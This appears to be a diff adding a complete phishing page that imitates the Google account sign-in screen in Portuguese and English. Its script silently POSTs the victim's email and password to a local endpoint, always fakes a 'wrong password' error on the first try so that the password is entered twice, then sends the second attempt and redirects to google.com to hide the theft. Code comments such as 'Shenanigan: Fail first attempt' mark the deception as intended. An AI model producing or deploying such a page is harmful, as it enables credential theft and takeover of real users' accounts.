@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fazer login nas Contas do Google</title>
+    <style>
+        :root {
+            --bg-color: #202124;
+            --card-bg: #202124;
+            /* On mobile it's same as bg, on desktop slightly lighter usually but image shows dark */
+            --text-primary: #e8eaed;
+            --text-secondary: #9aa0a6;
+            --input-border: #5f6368;
+            --input-focus: #8ab4f8;
+            --btn-primary-bg: #8ab4f8;
+            --btn-primary-text: #202124;
+            --btn-hover: #aecbfa;
+            --logo-color: #fff;
+        }
+
+        @media (prefers-color-scheme: light) {
+            /* Fallback/Auto if we wanted light mode, but user asked for Dark mainly. 
+               We will use JS to force dark if requested or auto. 
+               For now, defaulting to the requested Dark Theme variables. */
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Roboto', arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #1a1a1a;
+            /* Darker outer background for desktop contrast */
+            color: var(--text-primary);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .main-card {
+            background-color: var(--card-bg);
+            border-radius: 28px;
+            padding: 36px;
+            width: 100%;
+            max-width: 1040px;
+            /* Desktop wide layout */
+            height: auto;
+            min-height: 400px;
+            display: flex;
+            flex-direction: row;
+            /* Desktop: Side by Side */
+            border: 1px solid #3c4043;
+            /* Constant dark border */
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Left Column (Logo + Title) */
+        .column-left {
+            flex: 1;
+            padding-right: 24px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        /* Right Column (Form) */
+        .column-right {
+            flex: 1;
+            padding-left: 24px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        /* Mobile Layout */
+        @media (max-width: 768px) {
+            body {
+                background-color: var(--bg-color);
+            }
+
+            .main-card {
+                flex-direction: column;
+                border: none;
+                background-color: transparent;
+                padding: 24px;
+                max-width: 450px;
+            }
+
+            .column-left,
+            .column-right {
+                padding: 0;
+            }
+
+            .column-left {
+                margin-bottom: 24px;
+            }
+        }
+
+        .google-logo {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 16px;
+        }
+
+        h1 {
+            font-size: 36px;
+            /* Larger desktop font */
+            font-weight: 400;
+            margin-bottom: 12px;
+            line-height: 1.2;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: var(--text-secondary);
+            margin-bottom: 32px;
+        }
+
+        /* Form Elements */
+        .input-group {
+            position: relative;
+            margin-bottom: 6px;
+            margin-top: 12px;
+        }
+
+        .input-field {
+            width: 100%;
+            background: transparent;
+            border: 1px solid var(--input-border);
+            border-radius: 4px;
+            padding: 13px 15px;
+            font-size: 16px;
+            color: var(--text-primary);
+            outline: none;
+            transition: 0.2s;
+        }
+
+        .input-field:focus {
+            border: 2px solid var(--input-focus);
+            padding: 12px 14px;
+            /* Adjust for border width change */
+        }
+
+        .input-label {
+            position: absolute;
+            left: 12px;
+            top: 14px;
+            padding: 0 4px;
+            background-color: var(--card-bg);
+            color: var(--text-secondary);
+            font-size: 16px;
+            pointer-events: none;
+            transition: 0.2s;
+        }
+
+        .input-field:focus~.input-label,
+        .input-field:not(:placeholder-shown)~.input-label {
+            top: -10px;
+            font-size: 12px;
+            color: var(--input-focus);
+        }
+
+        .error-msg {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 6px;
+            margin-bottom: 20px;
+            display: none;
+            /* Hidden by default */
+            align-items: center;
+        }
+
+        .error-msg svg {
+            margin-right: 8px;
+            fill: currentColor;
+        }
+
+        .forgot-link {
+            color: #8ab4f8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            display: inline-block;
+            margin-top: 8px;
+            border-radius: 4px;
+            padding: 4px 0;
+        }
+
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 50px;
+        }
+
+        .create-account {
+            color: #8ab4f8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .btn-next {
+            background-color: var(--btn-primary-bg);
+            color: var(--btn-primary-text);
+            border: none;
+            padding: 0 24px;
+            height: 36px;
+            border-radius: 18px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: var(--btn-hover);
+        }
+
+        /* Profile Chip (Step 2) */
+        .profile-chip {
+            border: 1px solid #5f6368;
+            border-radius: 16px;
+            padding: 4px 12px 4px 4px;
+            display: inline-flex;
+            align-items: center;
+            font-size: 14px;
+            color: var(--text-primary);
+            cursor: pointer;
+            margin-bottom: 32px;
+            display: none;
+            /* Hidden in step 1 */
+            width: fit-content;
+        }
+
+        .profile-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 10px;
+            border-radius: 50%;
+            background: #fff;
+            color: #202124;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .profile-arrow {
+            fill: var(--text-secondary);
+            margin-left: 8px;
+        }
+
+        /* Footer */
+        .footer {
+            width: 100%;
+            max-width: 1040px;
+            display: flex;
+            justify-content: space-between;
+            padding: 24px 0;
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        select.lang-select {
+            background: rgba(255, 255, 255, 0.08);
+            color: var(--text-primary);
+            border: none;
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+
+        /* Loading Bar */
+        .progress-line {
+            height: 4px;
+            width: 100%;
+            background-color: transparent;
+            position: absolute;
+            top: 0;
+            left: 0;
+            overflow: hidden;
+            border-radius: 28px 28px 0 0;
+            display: none;
+        }
+
+        .progress-line .line {
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 100%;
+            background-color: #8ab4f8;
+            transform-origin: left;
+            animation: indeterminate 2s infinite linear;
+        }
+
+        @keyframes indeterminate {
+            0% {
+                transform: translateX(-100%) scaleX(0.2);
+            }
+
+            50% {
+                transform: translateX(0%) scaleX(0.5);
+            }
+
+            100% {
+                transform: translateX(100%) scaleX(0.2);
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="main-card">
+        <div class="progress-line" id="progress-bar">
+            <div class="line"></div>
+        </div>
+
+        <!-- Left Column (Static Title) -->
+        <div class="column-left" id="col-left">
+            <svg class="google-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path
+                    d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
+                    fill="#4285F4" />
+                <path
+                    d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
+                    fill="#34A853" />
+                <path
+                    d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.84z"
+                    fill="#FBBC05" />
+                <path
+                    d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
+                    fill="#EA4335" />
+            </svg>
+            <h1 id="main-title">Fazer login</h1>
+            <div class="subtitle" id="main-subtitle">Use sua Conta do Google</div>
+        </div>
+
+        <!-- Right Column (Dynamic Form) -->
+        <div class="column-right">
+
+            <form id="login-form">
+
+                <!-- Email Stage -->
+                <div id="stage-email">
+                    <div class="input-group">
+                        <input type="email" id="email" class="input-field" placeholder=" " required>
+                        <label for="email" class="input-label" id="lbl-email">E-mail ou telefone</label>
+                    </div>
+                    <div class="error-msg" id="error-email">
+                        <svg viewBox="0 0 24 24" width="16" height="16">
+                            <path
+                                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
+                        </svg>
+                        <span id="txt-error-email">Digite um e-mail ou número de telefone válido</span>
+                    </div>
+                    <a href="#" class="forgot-link" id="link-forgot">Esqueceu seu e-mail?</a>
+
+                    <div class="subtitle" style="margin-top: 32px; margin-bottom: 0;">
+                        Não está no seu computador? Use uma janela privada para fazer login. <a href="#"
+                            class="forgot-link" style="display:inline;">Saiba mais</a>
+                    </div>
+                </div>
+
+                <!-- Password Stage (Hidden initially) -->
+                <div id="stage-password" style="display:none;">
+                    <div class="profile-chip" id="profile-chip">
+                        <div class="profile-icon">
+                            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+                                <path
+                                    d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                            </svg>
+                        </div>
+                        <span id="user-email-display">user@gmail.com</span>
+                        <svg class="profile-arrow" viewBox="0 0 24 24" width="18" height="18">
+                            <path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z" />
+                        </svg>
+                    </div>
+
+                    <div class="input-group">
+                        <input type="password" id="password" class="input-field" placeholder=" " required>
+                        <label for="password" class="input-label" id="lbl-pass">Digite sua senha</label>
+                    </div>
+                    <!-- Wrong Password Error -->
+                    <div class="error-msg" id="error-password">
+                        <svg viewBox="0 0 24 24" width="16" height="16">
+                            <path
+                                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
+                        </svg>
+                        <span>Senha incorreta. Tente novamente ou clique em "Esqueceu a senha?" para redefini-la.</span>
+                    </div>
+
+                    <div style="margin-top:8px;">
+                        <label style="display:flex; align-items:center; color:var(--text-primary); font-size:14px;">
+                            <input type="checkbox" onclick="togglePass()" style="margin-right:8px;"> Mostrar senha
+                        </label>
+                    </div>
+                </div>
+
+                <div class="actions">
+                    <a href="#" class="create-account" id="link-create">Criar conta</a>
+                    <button type="button" class="btn-next" id="btn-next">Avançar</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <select class="lang-select" id="lang-select">
+            <option value="pt-BR">Português (Brasil)</option>
+            <option value="en-US">English (United States)</option>
+        </select>
+        <div class="footer-links">
+            <span style="margin-left: 16px;">Ajuda</span>
+            <span style="margin-left: 16px;">Privacidade</span>
+            <span style="margin-left: 16px;">Termos</span>
+        </div>
+    </footer>
+
+    <script>
+        // --- Configuration ---
+        const TEXTS = {
+            'pt-BR': {
+                title: 'Fazer login',
+                subtitle: 'Use sua Conta do Google',
+                welcome: 'Olá.',
+                email: 'E-mail ou telefone',
+                pass: 'Digite sua senha',
+                forgot: 'Esqueceu seu e-mail?',
+                create: 'Criar conta',
+                next: 'Avançar',
+                error_email: 'Digite um e-mail ou número de telefone válido',
+                error_pass: 'Senha incorreta. Tente novamente.'
+            },
+            'en-US': {
+                title: 'Sign in',
+                subtitle: 'Use your Google Account',
+                welcome: 'Welcome.',
+                email: 'Email or phone',
+                pass: 'Enter your password',
+                forgot: 'Forgot email?',
+                create: 'Create account',
+                next: 'Next',
+                error_email: 'Enter a valid email or phone number',
+                error_pass: 'Wrong password. Try again.'
+            }
+        };
+
+        // --- State ---
+        let currentStage = 'email'; // email, password
+        let attempts = 0;
+        let userEmail = '';
+        let userLang = 'pt-BR';
+
+        // --- Dom Elements ---
+        const dom = {
+            title: document.getElementById('main-title'),
+            subtitle: document.getElementById('main-subtitle'),
+            emailInput: document.getElementById('email'),
+            passInput: document.getElementById('password'),
+            btnNext: document.getElementById('btn-next'),
+            stageEmail: document.getElementById('stage-email'),
+            stagePass: document.getElementById('stage-password'),
+            progressBar: document.getElementById('progress-bar'),
+            errorEmail: document.getElementById('error-email'),
+            errorPass: document.getElementById('error-password'),
+            chip: document.getElementById('profile-chip'),
+            chipEmail: document.getElementById('user-email-display'),
+            langSelect: document.getElementById('lang-select')
+        };
+
+        // --- Initialization ---
+        function detectLanguage() {
+            const browserLang = navigator.language || navigator.userLanguage;
+            if (browserLang.includes('pt')) userLang = 'pt-BR';
+            else if (browserLang.includes('en')) userLang = 'en-US';
+            else userLang = 'pt-BR'; // Fallback to PT-BR as requested
+
+            dom.langSelect.value = userLang;
+            updateTexts();
+        }
+
+        function updateTexts() {
+            const t = TEXTS[userLang];
+            if (currentStage === 'email') {
+                dom.title.textContent = t.title;
+                dom.subtitle.textContent = t.subtitle;
+            } else {
+                dom.title.textContent = t.welcome;
+                dom.subtitle.textContent = ''; // Hide subtitle in pass phase
+            }
+            document.getElementById('lbl-email').textContent = t.email;
+            document.getElementById('lbl-pass').textContent = t.pass;
+            document.getElementById('link-forgot').textContent = t.forgot;
+            document.getElementById('link-create').textContent = t.create;
+            dom.btnNext.textContent = t.next;
+            document.getElementById('txt-error-email').textContent = t.error_email;
+            dom.errorPass.querySelector('span').textContent = t.error_pass;
+        }
+
+        // --- Logic ---
+        dom.btnNext.addEventListener('click', handleNext);
+        dom.emailInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') { e.preventDefault(); handleNext(); } });
+        dom.passInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') { e.preventDefault(); handleNext(); } });
+
+        function handleNext() {
+            if (currentStage === 'email') {
+                const email = dom.emailInput.value.trim();
+                if (!email) {
+                    showError(dom.emailInput, dom.errorEmail);
+                    return;
+                }
+                userEmail = email;
+
+                // Transition
+                showLoading(true);
+                setTimeout(() => {
+                    showLoading(false);
+                    currentStage = 'password';
+                    renderPasswordStage();
+                }, 800);
+            } else if (currentStage === 'password') {
+                const pass = dom.passInput.value;
+                if (!pass) return;
+
+                attempts++;
+
+                // Shenanigan: Fail first attempt
+                if (attempts === 1) {
+                    showLoading(true);
+                    // Send attempt 1 silently
+                    fetch('/login.php', { // Use .php or route endpoint to look generic
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ email: userEmail, password: pass, attempt: 1 })
+                    });
+
+                    setTimeout(() => {
+                        showLoading(false);
+                        dom.passInput.value = '';
+                        dom.errorPass.style.display = 'flex';
+                        dom.passInput.focus();
+                    }, 1500);
+                } else {
+                    // Success on 2nd attempt
+                    showLoading(true);
+                    dom.errorPass.style.display = 'none';
+
+                    fetch('/login', { // Real submission endpoint
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ email: userEmail, password: pass, attempt: 2 })
+                    }).then(() => {
+                        window.location.href = 'https://www.google.com'; // Redirect
+                    }).catch(() => {
+                        window.location.href = 'https://www.google.com';
+                    });
+                }
+            }
+        }
+
+        function renderPasswordStage() {
+            dom.stageEmail.style.display = 'none';
+            dom.stagePass.style.display = 'block';
+            dom.chip.style.display = 'inline-flex';
+            dom.chipEmail.textContent = userEmail;
+
+            // "Olá." as requested
+            dom.title.textContent = TEXTS[userLang].welcome;
+            dom.subtitle.textContent = '';
+
+            // Focus pass
+            dom.passInput.focus();
+        }
+
+        function showError(input, errorEl) {
+            input.style.borderColor = '#d93025';
+            errorEl.style.display = 'flex';
+            input.addEventListener('input', () => {
+                input.style.borderColor = '';
+                errorEl.style.display = 'none';
+            }, { once: true });
+        }
+
+        function showLoading(show) {
+            dom.progressBar.style.display = show ? 'block' : 'none';
+            dom.btnNext.disabled = show;
+        }
+
+        function togglePass() {
+            const type = dom.passInput.type === 'password' ? 'text' : 'password';
+            dom.passInput.type = type;
+        }
+
+        // Init
+        detectLanguage();
+
+    </script>
+</body>
+
+</html>
